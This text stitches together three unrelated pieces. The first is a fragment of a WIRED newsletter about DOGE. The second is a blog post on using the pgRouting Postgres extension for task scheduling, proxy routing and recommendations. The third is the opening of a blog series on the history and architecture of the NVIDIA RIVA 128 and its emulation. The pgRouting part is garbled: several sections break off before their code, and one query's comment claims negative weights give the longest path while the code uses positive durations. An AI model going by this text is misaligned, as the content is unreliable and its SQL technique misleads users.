href="mailto:mail@wired.com">mail@wired.com</a>.</p><h2>WIRED Reads</h2><ul><li><strong><a href="https://www.wired.com/story/doge-autorif-mass-firing-government-workers/">DOGE Is Working on Software That Automates the Firing of Federal Workers</a>:</strong> Operatives working for Elon Musk’s DOGE appear to be editing the code of AutoRIF—software designed by the Defense Department that could assist in mass firings of federal workers, sources tell WIRED.</li><li><strong><a href="https://www.wired.com/story/doge-hud-systems-access-ai-proptech-real-estate-mobile-home/">DOGE Staffers at HUD Are From an AI Real Estate Firm and a Mobile Home Operator</a>:</strong> Elon Musk’s men at HUD come from the real estate sector.

<p><a href="https://github.com/pgRouting/pgrouting">pgRouting</a> is a Postgres extension. It's often used for finding the “shortest path” between two locations, however it's a hidden gem in Postgres and can be used for basic graph functionality.</p>

<p>pgRouting is typically combined with PostGIS for working with geospatial data, but it can also be <a href="https://news.ycombinator.com/item?id=26350454">useful beyond that</a> as a lightweight alternative to Graph extensions like <a href="https://age.apache.org/">Apache AGE</a>, or specialized graph databases like <a href="https://neo4j.com/">Neo4j</a>.</p>
<p>Let's explore some useful applications of pgRouting and graphs.</p>

<p>pgRouting is an extension of PostGIS that provides geospatial routing functionality. You can use it to calculate the shortest path, perform network analysis, and solve complex routing problems on a graph-based structure. Most commonly, this is used in Geographic Information Systems (GIS) for tasks like determining the fastest route between two locations.</p>


<p>The power of pgRouting lies in its ability to work with any data structured as a graph. A graph is essentially a network of interconnected points, where:</p>
<ul>
<li><strong>Nodes</strong> represent entities.</li>
<li><strong>Edges</strong> represent relationships or paths between those nodes.</li>
</ul>
<p>In maps / <a href="https://en.wikipedia.org/wiki/Geographic_information_system">GIS</a>, nodes and edges represent intersections and roads respectively. However, this structure can also be applied to abstract systems like a social networks, where users are nodes and friendships are edges.</p>
<!-- -->

<p>Let's explore how pgRouting can be applied to a few non-<a href="https://en.wikipedia.org/wiki/Geographic_information_system">GIS</a> problems.</p>
<h3 id="task-scheduling">Task scheduling</h3>
<p>In any project, tasks have dependencies. For example, task B can only start after task A is completed. This creates a <a href="https://en.wikipedia.org/wiki/Directed_acyclic_graph">directed acyclic graph</a> (DAG), where:</p>
<ul>
<li>nodes represent tasks</li>
<li>edges represent dependencies</li>
</ul>
<p>One of the most challenging aspects of managing projects is determining the “critical path” — the project's overall duration, determined by the longest sequence of dependencies.</p>
<!-- -->
<p>Using pgRouting, you can model your task's dependencies, using graph algorithms to find the critical path. Suppose we have a table tasks with task dependencies modeled as a graph:</p>
<div><p><code><br><div><p><span>_<!-- -->35</span></p><p><span>-- Create the tasks table with dependencies</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>create table tasks (</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  id serial primary key,</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  name text not null</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>);</span></p></div><div><p><span>_<!-- -->35</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>-- insert tasks into the table</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>insert into tasks (name)</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>values</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  ('Start Project'),</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  ('Task A'),</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  ('Task B'),</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  ('Task C'),</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  ('Task D'),</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  ('End Project');</span></p></div><div><p><span>_<!-- -->35</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>-- create the dependencies table</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>create table dependencies (</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  id serial primary key,</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  source integer not null, -- task id where the dependency starts</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  target integer not null, -- task id where the dependency ends</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  duration integer not null, -- duration of the task in days</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  constraint fk_source foreign key (source) references tasks (id),</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  constraint fk_target foreign key (target) references tasks (id)</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>);</span></p></div><div><p><span>_<!-- -->35</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>-- insert dependencies with durations (directed edges)</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>insert into dependencies (source, target, duration)</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>values</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  (1, 2, 3), -- start project -&gt; task a (3 days)</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  (2, 3, 4), -- task a -&gt; task b (4 days)</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  (3, 4, 5), -- task b -&gt; task c (5 days)</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  (4, 5, 2), -- task c -&gt; task d (2 days)</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>  (5, 6, 6);</span></p></div><div><p><span>_<!-- -->35</span></p><p><span>-- task d -&gt; end project (6 days)</span></p></div><br></code></p></div>
<p>You can then use the <a href="https://docs.pgrouting.org/latest/en/pgr_dijkstra.html"><code>pgr_dijkstra()</code></a> function to find the shortest (or longest) path through the tasks, allowing you to map out the project schedule effectively:</p>
<div><p><code><br><div><p><span>_<!-- -->10</span></p><p><span>create schema if not exists extensions;</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>create extension pgrouting schema extensions cascade;</span></p></div><div><p><span>_<!-- -->10</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>-- find the longest path using pgr_dijkstra()</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>-- (as it calculates shortest path, use negative weights)</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>select * FROM extensions.pgr_dijkstra(</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>    'select id, source, target, duration as cost from dependencies',</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>    1,  -- Start Project (Task ID 1)</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>    6   -- End Project (Task ID 6)</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>);</span></p></div><br></code></p></div>
<p>Which returns a table showing that this project will take 20 days from start to finish:</p>

<details><summary>Tangent: the Dijkstra algorithm</summary><p>The <code>pgr_dijkstra()</code> function implements <a href="https://en.wikipedia.org/wiki/Dijkstra's_algorithm">Dijkstra's
algorithm</a>, which is used to find the
shortest path between nodes in a graph. This algorithm guarantees the shortest path from a
source node to a target node (or all other nodes), based on the cost of edges connecting the
nodes.</p><p>Fun fact: Dijkstra's algorithm was published in 1959 by Dutch computer scientist Edsger
Dijkstra. It's a “greedy” algorithm, meaning it always picks the closest, cheapest node to
explore next.</p></details>
<h3 id="reverse-proxy-routing-based-on-resource-allocation">Reverse proxy routing based on resource allocation</h3>
<p>Distributed systems usually involve allocating resources efficiently across a network of nodes. Each node might represent a physical location or a computing process, and the edges represent the available pathways to move resources between them. For example, in a cloud infrastructure, pgRouting could help determine how to allocate compute tasks across a set of distributed servers by finding the shortest or least-congested path to route data.</p>
<p>Suppose you have a network of servers represented by nodes and their data connections as edges in a table servers.</p>

<h3 id="recommendation-engines-like-youtube">Recommendation engines like YouTube</h3>
<p>In recommendation engines or search algorithms that use knowledge graphs, pgRouting can be used to build relationships between entities and events. Take YouTube's recommendation algorithm, we can structure this data as a graph where:</p>

<p>Now we can use the <code>pgr_dijkstra()</code> function to find the shortest or most relevant path between a user and new videos. For example, let's find videos that are most relevant to <code>user_01</code> considering their past interactions:</p>
<details><summary>Tangent: ranking recommendations</summary><p>Since it's “just postgres” it's simple enough to rank the results using an <code>order by</code> clause. For example, if we stored the <code>pgr_dijkstra()</code> results above in a table called “recommendations”, we use this a query like this to sort the paths by the highest ranking:</p><div><p><code><br><div><p><span>_<!-- -->10</span></p><p><span>select videos.title, sum(weight) as recommendation_score</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>from</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>  recommendations</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>  join videos on recommendations.target = videos.id</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>group by videos.title</span></p></div><div><p><span>_<!-- -->10</span></p><p><span>order by recommendation_score desc;</span></p></div><br></code></p></div></details>

<h2 id="introduction">Introduction</h2>

<p>The NVIDIA RIVA 128 is a graphics card released in 1997 by NVIDIA, nowadays of AI and $2000 overpriced quad-slot GPU fame. It was a Direct3D 5.0-capable accelerator, and one of the first to use a standard graphics API such as DirectX as its “native” API. I have been working on emulating this graphics card for the last several months; currently, while VGA works and the drivers are loading successfully on Windows 2000, they are not rendering any kind of accelerated output yet. Many people, myself included, have asked for and even tried to develop emulation for this graphics card and other similar cards (such as its successor, “NV4” or RIVA TNT), but have not succeeded yet, although many of these efforts continue. This is the first part of a series where I explore the architecture and my experiences in emulating this graphics card. I can’t guarantee success, but if it was successful, it appears that it would be the first time that a full functional emulation of this card has been developed; although later NVIDIA cards have been emulated to at least some extent, such as the GeForce 3 in Cxbx-Reloaded and Xemu.</p>

<p>This is the first part in a series of blog posts that aims to demystify, once and for all, NVIDIA RIVA 128. This first part will dive into the history of NVIDIA up to the release of the RIVA 128, and a brief overview of how the chip actually works. The second part will dive into the architecture of NVIDIA’s drivers and how they relate to the hardware, and the third part will follow the lifetime of a graphics object from birth to display on the screen in extreme detail. Then, part four and an unknown number of parts after part four will go into detail on the experiences of developing a functional emulation for this graphics card.</p>

<h2 id="a-not-so-brief-history">A not so brief history</h2>

<h3 id="beginnings">Beginnings</h3>

<p>NVIDIA was conceived in 1992 by three LSI Logic and Sun Microsystems engineers: Jensen Huang (now one of the world’s richest men, still the CEO and, apparently, mobbed by fans in his country of birth Taiwan), Curtis Priem (whose boss almost convinced him to work on Java instead of founding the company) and Chris Malachowsky (a veteran of graphics chip development). They saw a business opportunity in the PC graphics and audio market, which was dominated by low-end, high-volume players such as S3 Graphics, Tseng Labs, Cirrus Logic and Matrox<sup id="fnref:matrox" role="doc-noteref"><a href="#fn:matrox" rel="footnote">1</a></sup>. The company was formally founded on April 5, 1993, after all three left their jobs at LSI Logic and Sun between December 1992 and March 1993.</p>

<p>After the requisite $3 million of venture capital funding was acquired (a little nepotism owing to their reputation helped), work immediately began on a first generation graphics chip; this was one of the first of a rush of dozens of companies attempting to develop graphics cards - both established players in the 2D graphics market such as Number Nine and S3, and new companies, almost all of which no longer exist - many of which failed to even release a single graphics card. The name was initially GXNV for “GX next version”, after a graphics chip Malachowsky led the development of at Sun, but Huang requested him to rename the chip to NV1 in order to not get sued. This also inspired the name of the company - NVIDIA, after other names such as “Primal Graphics” and “Huaprimal” were considered and rejected, and their originally chosen name of “Invision” turned out to have been trademarked by a toilet paper company.</p>

<p>In a perhaps ironic twist of fate, toilet paper turned out to be an apt metaphor for the sales, if not quality, of their first product, which Jensen Huang appears to be embarassed to discuss when asked, and has been quoted as saying “You don’t build NV1 because you’re great”. The product was released in 1995 after a two-year development cycle and the creation of what NVIDIA dubbed a hardware simulator, but actually appears to have been simply a set of Windows 3.x drivers intended to emulate their architecture, called the NV0 in 1994.</p>

<h3 id="the-nv1">The NV1</h3>

<p>The <strong>NV1</strong> was a combination graphics, audio, DRM (yes, really) and game port card implementing what NVIDIA dubbed the “NV Unified Media Architecture” (UMA); the chip was manufactured by SGS-Thomson Microelectronics (now STMicroelectronics) on a 350-nanometer process node, who also white-labelled NVIDIA’s design (which allegedly<sup id="fnref:contract" role="doc-noteref"><a href="#fn:contract" rel="footnote">2</a></sup> featured a DAC block designed by SGS-Thomson) as the STG-2000, a variant without audio functionality, also called the “NV1-V32” (for 32-bit VRAM) in internal documentation as opposed to NVIDIA’s NV1-D64. The chip was designed to implement a reasonable level of 3D graphics functionality, as well as audio, public-key encryption for DRM purposes (ultimately never used as it would have required the cooperation of software companies) and Sega Saturn game ports, all within a single megabyte of RAM, as memory costs were around $50 a megabyte when initial design began in 1993.</p>

<p>In order to achieve this, many techniques had to be used that ultimately compromised the chip’s 3D rendering quality, such as forward texture mapping, where a texel (output pixel) of a texture is directly mapped to a point on the screen, instead of the more traditional inverse texture mapping, which iterates through pixels and maps texels from those. While this has memory space advantages (as you can cache the texture in the very limited amount of VRAM NVIDIA had to work with very easily), it has many more disadvantages; firstly, this approach does not support UV mapping (a special coordinate system used to map textures to three-dimensional objects) and other aspects of what would be considered to be today basic graphical functionality.</p>

<p>Additionally, the fundamental implementation of 3D rendering used quad patching instead of traditional triangle-based approaches; this has very advantageous implications for things like curved surfaces, and may have been a very effective design for the CAD/CAM customers purchasing more high end 3D products, however, it turned out to not be particularly useful at all for the actually intended target market of gaming. There was also a total lack of Sound Blaster compatibility (very much a requirement for half-decent audio in games back then) in the audio engine, and VGA compatibility was very slow and partially emulated, which led to slow performance in the games people <em>actually played</em>, unless your favourite game was a crappier, slower version of <em>Descent</em>, <em>Virtua Cop</em> or <em>Daytona USA</em> for some reason. Another body blow to NVIDIA was received when Microsoft released Direct3D in 1996 with DirectX 2.0, which not only used triangles, but also became the standard 3D API and deprecated all of the numerous non-OpenGL proprietary APIs of the time, including S3’s S3D and MeTaL<sup id="fnref:metal" role="doc-noteref"><a href="#fn:metal" rel="footnote">3</a></sup>, ATI’s 3DCIF, and NVIDIA’s own NVLIB.</p>

<p>The upshot of all of this was what can be understood as nothing less than the total failure of NVIDIA to sell or convince anyone to develop for NV1 in any way, despite its innovative silicon design. While Diamond Multimedia purchased 250,000 chips to place into their “Edge 3D” series of cards, and other manufacturers produced cards in smaller quantities, barely any of them sold, and those that did sell were often returned, leading to the chips themselves being returned to NVIDIA and hundreds of thousands of chips sitting simply unused in warehouses. Barely any NV1-capable software was released, with the few pieces of software that do exist coming via a partnership with Sega (more on that later), while most others were forced to run under software emulators for Direct3D (or other APIs) written by Priem, which were made possible by the software architecture NVIDIA chose for their drivers, but were slower and worse-looking than software rendering, buggy, and generally extremely unappealing.</p>

<p>NVIDIA lost $6.4 million in 1995 on a revenue of $1.1 million, and $3 million on a revenue of $3.9 million in 1996. Most of the capital that allowed NVIDIA to continue operating were from the milestone payments from SGS-Thomson for developing the chip, their NV2 contract with Sega (again, more on that later), and their venture capital funding, but not from the very few NV1 sales. The NV1 was poorly reviewed, had very little software and ultimately almost no sales; despite various desperate efforts to revive it, including releasing the SDK for free (with a new proprietary <em>NVLIB</em> API for game development as an alternative to direct hardware programming) and by early 1996 straight up begging customers on their website to spam developers with requests to add NV1 support to games, the chip was effectively dead within a year.</p>

<h3 id="the-nv2">The NV2</h3>

<p>Nevertheless, NVIDIA grew to close to a hundred employees, including sales and marketing teams. The company, and especially its cofounders, remained confident in their architecture and overall prospects of success. They had managed to solidify a business relationship with Sega, to the point where they had initially won the contract to provide the graphics hardware for the successor to the Sega Saturn, at that time codenamed “V08”. The GPU was codenamed “Mutara” (after the nebula critical to the plot in <em>Star Trek II: The Wrath of Khan</em>) and the overall architecture was the <strong>NV2</strong>. It maintained many of the functional characteristics of the NV1 and was essentially a more powerful successor to that chip. According to available sources, this would have been the only NVIDIA chip manufactured by the then-just founded Helios Semiconductor.</p>

<p>However, problems started to emerge almost immediately. Game developers, especially Sega’s internal teams, were not happy with having to use a GPU with such a heterodox design; for example, porting games to or from the PC, which Sega did do at the time, would be made far harder. This position was especially championed by Yu Suzuki, head of one of Sega’s most prestigious internal development teams Sega-AM2, responsible for the <em>Daytona USA</em>, <em>Virtua Racing</em>, <em>Virtua Fighter</em>, and <em>Shenmue</em> series among others, who sent his best graphics programmer to interface with NVIDIA and push for the company to change the rendering method to a more traditional triangle-based approach. At this point, the story diverges: some tellings claim that NVIDIA simply refused to accede to Sega’s request and this damaged their relationship irreparably, leading to the NV2’s cancellation; others that the NV2 wasn’t killed until it failed to produce any video during a demonstration, and Sega still paid NVIDIA for developing it to prevent bankruptcy, with a single engineer apparently assigned to (and succeeding at) getting the chip working for the sole purpose of receiving a milestone payment.</p>

<p>At some point, Sega, as a traditional Japanese company, couldn’t simply kill the deal, so the NV2 was officially relegated to be used in the successor to the educational toddler-aimed Sega Pico, while in reality, Sega of America had already been told to “not worry” about NVIDIA anymore. NVIDIA got the hint, and the NV2 was cancelled. With both NV1 and NV2 out of the picture, NVIDIA had no sales, no customers, and barely any money; by late 1996, the company had $3 million in the bank and was burning through $330,000 a month, and most of the NV2 team had been redeployed to the next-generation NV3. No venture capital funding was going to be forthcoming due to the failure to actually create any products people wanted to buy, at least not without extremely unfavourable terms on things like ownership. The company was effectively almost a complete failure and a waste of years of the employees’ time.</p>

<h3 id="near-destruction-of-the-company">Near destruction of the company</h3>

<p>By the end of 1996, things had gotten infinitely worse, with the competition heating up extraordinarily fast; despite NV1 being the first texture-mapped consumer GPU ever released, they had been fundamentally outclassed by their competition. It was a one-two punch: initially, Rendition - founded around the same time as NVIDIA in 1993 - released its V1000 chip based on a custom RISC architecture, and while not particularly fast, it was, for a few months, the only chip that could run Quake (the hottest game of 1996) in hardware accelerated mode. The V1000 was an early market leader, alongside S3’s laughably bad ViRGE (Video and Rendering Graphics Engine) which was infamously slower than software rendering on high-end CPUs at launch, and was reserved for high-volume OEM bargain-bin disaster machines.</p>

<p>However, this was nothing compared to the body blow about to hit the entire industry, NVIDIA included. At a conference in early 1996, an $80,000 machine from SiliconGraphics, then the world leader in accelerated graphics, crashed during a demo by the then-CEO Ed McCracken. If accounts of the event are to be believed, while the machine rebooted, people who had heard rumors left the room and headed downstairs to another demo by a then-tiny company made up of ex-SGI employes calling themselves “3D/fx” (later shortened to 3dfx), claiming comparable graphics quality for $250… with demos to prove it. As with many cases of supposed “wonder innovations” in the tech industry, it was too good to be true, but when their card, the “Voodoo Graphics” was first released in the form of the “Righteous 3D” by Orchid in October 1996, it turned out to be true. Despite the fact that it was a 3D-only card and required a 2D card to be installed, and the fact it could not accelerate graphics in a window (which almost all other cards could do), performance was so high relative to other products (including the NV1) that it not only had rave reviews on its own but also kicked off a revolution in consumer 3D graphics, which especially caught fire when GLQuake was released in January 1997.</p>

<p>The reasons for 3dfx being able to design such an effective GPU when all others failed were numerous. The price of RAM plummeted by 80% throughout 1996, allowing the Voodoo’s estimated retail price to be cut from $1000 to $300; many of their staff members came from SiliconGraphics, perhaps the most respected and certainly the largest company in the graphics industry of that time<sup id="fnref:sgi" role="doc-noteref"><a href="#fn:sgi" rel="footnote">4</a></sup>; and while the Voodoo used a proprietary API called Glide, it also supported OpenGL and Direct3D. Glide was designed to be very similar to OpenGL while allowing for 3dfx to approximate standard graphical techniques, which, as well as their driver design; the Voodoo only accelerates edge interpolation<sup id="fnref:edge" role="doc-noteref"><a href="#fn:edge" rel="footnote">5</a></sup>, texture mapping and blending, span interpolation<sup id="fnref:span" role="doc-noteref"><a href="#fn:span" rel="footnote">6</a></sup>, and final presentation of the rendered 3D scene, while the rest is all done in software. All of these factors were key in what proved to be an exceptionally high-quality product at an exceptionally low price for the time.</p>

<p>Meanwhile, NVIDIA effectively had to design a graphics architecture that could at the very least get close to 3dfx’s performance, on a shoestring budget and with very little resources, as 60% of their staff (including the entire sales and marketing teams) had been laid off to preserve money. They could not do a complete redesign of the NV1 from scratch if they felt the need to, as it would take two years (time they simply didn’t have) and any design that came out of this effort would be immediately obsoleted by competitors, such as 3dfx’s Voodoo series, and ATI’s Rage which was initially rather pointless but rapidly advancing in performance and driver stability. The chip would also have to work reasonably well on the first tapeout, as there was no capital to produce more revisions of the chip. The fact NVIDIA were able to achieve a successful design in the form of the NV3 under such conditions was a testament to the intelligence, skill and luck of their designers; we will explore how they managed to achieve this later on this write-up.</p>

<h3 id="the-nv3">The NV3</h3>

<p>It was with these financial, competitive and time constraints in mind that design on the NV3 began in 1996. This chip would eventually be commercialised as the RIVA 128, standing for “Real-time Interactive Video and Animation accelerator” followed by a nod to its 128-bit internal bus width, which was very large for the time. NVIDIA retained SGS-Thomson (soon to be STMicroelectronics) as their manufacturing partner, in exchange for SGS-Thomson cancelling their competing STG-3001 GPU. In a similar vein to the NV1, NVIDIA was to sell the chip as “NV3” and SGS-Thomson was to white-label it as STG-3000, once again separated by audio functionality; however, NVIDIA convinced SGS-Thomson to cancel their own part and stick to manufacturing the NV3 instead, which later proved to be a terrible decision when NVIDIA dropped them in favor of TSMC for manufacturing of the RIVA 128 ZX due to both yield issues and pressure from venture capital funders. ST went on to manufacture the PowerVR Kyro series of GPU chips before dropping out of the market entirely by 2002.</p>

<p>After the NV2 disaster, the company made several calls on the NV3’s design that turned out to be very good decisions. First, they acquiesced to Sega’s advice (which they might have already done to save the Mutara V08/NV2, but it was too late) and moved to an inverse texture mapping triangle-based model, although some remnants of the original quad patching design remain. The unused DRM functionality was also removed, which may have been assisted by David Kirk<sup id="fnref:dkirk" role="doc-noteref"><a href="#fn:dkirk" rel="footnote">7</a></sup> taking over from Curtis Priem as chief designer, as Priem insisted on including the DRM functionality with the NV1, citing piracy issues with the game he had written as a demo of the Malachowsky-designed GX GPU back when he worked at Sun.</p>

<p>Another decision that turned out to pay very large dividends was deciding to forgo a native API entirely and build the card around accelerating the most popular graphical APIs, which led to an initial focus on Direct3D, although OpenGL drivers were first publicly released in alpha form in December 1997 and fully in early 1998. DirectX 3.0 was the initial target, and after 4.0 was <a href="https://devblogs.microsoft.com/oldnewthing/20040122-00/?p=40963">cancelled due to lack of developer interest in its new functionality</a>, 5.0 came out late during development of the chip, which turned out to be mostly compliant, with the exception of some blending modes such as additive blending which Jensen Huang later claimed was due to Microsoft not giving them the specification in time. This compliance was made much easier by the design of their driver, which allowed (and still allows) graphical APIs to be plugged in as “clients” to the Resource Manager kernel; as I mentioned earlier, this will be explained in full detail later.</p>

<p>The VGA core, previously so separate from the main GPU on the NV1 that it had its own PCI ID, was replaced by a new one licensed from Weitek who would soon exit the graphics market. The core was placed in the chip parallel to the main GPU with its own 32-bit bus, which massively accelerated performance in unaccelerated VESA titles such as <em>Doom</em>, and provided a real advantage over the 3D-only 3dfx cards, especially as their combination SST-96 or Voodoo Rush card used a questionable Alliance chip and was generally considered a failure. Finally, Huang, in his capacity as the CEO, allowed the chip to be expanded (in terms of physical size and number of gates) from its original specification, allowing for a more complex design with more features.</p>

<p>The initial revision of the architecture appears to have been completed in January 1997. Then, aided by hardware simulation software (an actual hardware simulation unlike the NV0) purchased from another almost-bankrupt company, an exhaustive test set was completed. The first bug presented itself almost immediately when the “C” character in the MS-DOS codepage appeared incorrectly, Windows took 15 minutes to boot, and moving the mouse cursor required a map of the screen so you didn’t lose it by moving too far, but ultimately the testing was completed. However, NVIDIA didn’t have the money to respin the silicon for a second stepping if problems appeared, so it had to work at least reasonably well in the first stepping.</p>

<h3 id="riva-128">RIVA 128</h3>

<p>Luckily for NVIDIA, the NV3 chip worked well enough to be sold to their board partners (almost certainly thanks to that hardware simulation package), and the company survived. Most accounts indicate they were only three or four weeks away from bankruptcy; when 3dfx saw the RIVA 128 at its reveal at the CGDC 1997 conference, one founder responded with “you guys are still around?”, considering 3dfx almost <em>bought</em> NVIDIA effectively for the purpose of killing the company as a theoretical competitor, but NVIDIA refused as they assumed they would be bankrupt within months anyway. However, this revision A of the chip was not the one NVIDIA actually commercialised; SGS-Thomson dropped their plans for the STG-3000 at some point, which led NVIDIA, now flush with cash<sup id="fnref:revenue" role="doc-noteref"><a href="#fn:revenue" rel="footnote">8</a></sup>, to create a new revision of the chip to remove the sound functionality (although some parts remained), fix some errata and make other minor adjustments to the silicon.</p>

<p>The chip was respun, with the revision B silicon being completed in October 1997 and presumably available a month or two later; it is most likely that some revision A cards were sold at retail, but based on the dates, these would have to be very early units<sup id="fnref:stb" role="doc-noteref"><a href="#fn:stb" rel="footnote">9</a></sup>, with the earliest NVIDIA RIVA 128 drivers that I have discovered (labelled as “Version 0.75” and also doubling as the only NV1 drivers for Windows NT) being dated August 1997, and reviews starting to drop on websites such as AnandTech in the first half of September 1997. There are no known drivers available for the audio functionality in the revision A RIVA 128, so anyone wishing to use it would have to write custom drivers.</p>

<p>The RIVA 128 was generally well-reviewed at its launch and considered as the fastest graphics chip released in 1997, beating the Voodoo1 in raw speed but not output video quality, most likely due to NVIDIA’s financial situation leading to rushed development of the chip with shortcuts taken in the design process in order to ship on time. Examples of this lower quality include the lack of support for some of Direct3D 5.0’s blending modes, and the use of per-polygon mipmapping<sup id="fnref:mipmap" role="doc-noteref"><a href="#fn:mipmap" rel="footnote">10</a></sup> instead of the more accurate per-pixel approach, causing seams between different mipmapping layers; the dithering and bilinear texture filtering quality were often criticised as well, and some games exhibited seams between polygons. Furthermore, the drivers were generally very rough at launch, especially if the graphics card was an upgrade and previous drivers were not; while NVIDIA were able to fix many driver issues by the 3.xx versions released in 1998 and 1999, going as far as writing a fairly decent OpenGL ICD, the standards for graphical quality had risen over time and what was considered “decent” in 1997 was considered to be “bad” and even “awful” by 1999.</p>

<p>Nevertheless, over a million RIVA 128 units sold within a few months, and NVIDIA’s immediate existence as a company was secured; an enhanced version (revision C, also called “NV3T”) was released in March 1998 as the RIVA 128 ZX, in order to compete with the Intel/Lockheed Martin i740, a chip which was hyped as being very fast on paper but turned out to be not very good, leading to Intel starting their long line of sub-par integrated GPUs before finally returning to the discrete market in recent years under the Arc brand, with the current Battlemage line being their <em>13th or 16th generation</em> product depending on who you ask.</p>

<p>After all of this history and exposition, we are finally ready to actually explore the GPU behind the RIVA 128 series. I refer to it as NV3 as a catch-all term for all chips using this architecture, including the RIVA 128, RIVA 128 ZX, and the hypothetical STG-3000. Note that the 32-bit Weitek VGA core’s architecture will not be discussed at length here unless absolutely required, as it is pretty much a standard SVGA core, and really is not that interesting compared to the main GPU; they’re not even substantially integrated, although there are a few areas in the design that allow the main GPU to write directly to the Weitek’s registers.</p>

<h2 id="architectural-overview">Architectural overview</h2>

<p>NV3 is the third-generation NV architecture designed by NVIDIA in 1997, commercialised as the RIVA 128 family. It implements a fixed-function 2D and 3D render path primarily aimed at desktop software and video games, with hardware acceleration best described as partial by modern standards, but one of the more complete, fully-featured solutions for 1997. It can be attached through the legacy PCI 2.1 bus or AGP 1X (2X on the RIVA 128 ZX), a higher-speed superset of PCI designed for graphics which was brand new at the time but ultimately proved successful.</p>

<p>The primary goals of this architecture were low manufacturing cost, short development time (due to NVIDIA’s dire financial condition at the time), and beating the 3dfx Voodoo1 in raw pixel pushing performance. It generally achieved these goals with caveats, with a bulk cost of $15 per chip, a design period of around 9 months (excluding Revision B), and performance generally better than that of the Voodoo, in spite of 3dfx’s more integrated Glide API, and NVIDIA’s smaller performance advantage with large triangles as compared to smaller ones.</p>

<p>While the focus of study has been the Revision B card, efforts have been made to understand the A and C revisions as well. Each revision has different values for the GPU ID in the framebuffer boot configuration register in MMIO space (at offset <code>0x100000</code>) and the PCI configuration space Revision ID register:</p>

</table>

<p>There is a common misconception that the PCI ID is different on RIVA 128 ZX chips; this is partially true, but misleading. The standard NV3 architecture uses a PCI vendor ID of <code>0x12D2</code> (identified as “NVidia / SGS Thomson (Joint Venture)” by <a href="https://pci-ids.ucw.cz/">The PCI ID Repository</a>) instead of NVIDIA’s own <code>0x10DE</code>, with a device ID of <code>0x0018</code>, or <code>0x0019</code> on a RIVA 128 ZX with ACPI enabled. However, the presence of a <code>0x0019</code> device ID is not sufficient for a RIVA 128 ZX to be detected as such; the revision must be C, or <code>0x20</code>, regardless of device ID, as confirmed through VBIOS and driver reverse engineering. Since the device ID can be either value, the best way to check is to use the revision ID encoded into the board at manufacturing time, through the NV_PFB_BOOT_0 register or PCI configuration space.</p>

<p>The NV3 architecture incorporates accelerated triangle setup (the Voodoo is limited to around 2/3 of that), the aforementioned span and edge interpolation, texture mapping, blending, and final presentation. It does not accelerate the initial polygon transformation or lighting rendering phases. It is capable of rendering in 2D at a resolution of up to 1280x1024 (at least 1600x1200 in ZX, not sure what?) and 32-bit colour. 3D rendering is only possible in 16-bit colour, and at 960x720 or lower in a 4 MB card due to a lack of VRAM. EDID is supported for monitor identification via an entirely software-programmed I2C bus.</p>

<p>While 2 MB and even 1 MB cards were planned, they were seemingly never released. The level of pain of using them can only be imagined; there were also low-end cards released that only used a 64-bit bus, handled using a manufacture-time configuration mechanism (sometimes exposed via DIP switches) known as straps, which will be explained in Part 2. To compete with the i740, the RIVA 128 ZX had, among other changes that will be described later, an increased amount of VRAM (8 MB) also allowing it to render 3D at higher resolutions of up to 1280x1024.</p>

<p>The design of the RIVA is very complex compared to other contemporaneous video cards. I am not sure why such a complex design was used, but it was inherited from the NV1; the only real reason I can think of is that the overengineered design is intended to be future-proof and easy to enhance without requiring complete rewiring of the silicon, as many other companies had to do. The GPU is split into a around a dozen subsystems (functional hardware blocks), each with names starting in <code>P</code> for some reason; some examples are <code>PGRAPH</code>, <code>PTIMER</code>, <code>PFIFO</code>, <code>PRAMDAC</code> and <code>PBUS</code>. Presumably, a subsystem has a 1:1 mapping with a functional block on the GPU die, since the registers are named after the subsystem that they are a part of.</p>

<p>There are several hundred different registers across the entire graphics card, so things are necessarily simplified for brevity, at least in Part 1. To be honest, the architecture of this graphics card is too complicated to show in a diagram without simplifying things so much as to be effectively pointless or complicating it to the point of not being useful (I tried!), so a diagram has not been provided.</p>

<h3 id="fundamental-concept-the-scene-graph">Fundamental concept: the scene graph</h3>

<p>In order to begin this journey through the NVIDIA NV3 architecture, you must understand the fundamental concept of a scene graph. Although the architecture does not strictly implement a scene graph, knowing the concept helps understand how graphical objects are represented by the GPU. A scene graph is a description of a form of tree where the nodes of the tree are graphical objects, and the properties of a parent object cascade down to its children.</p>

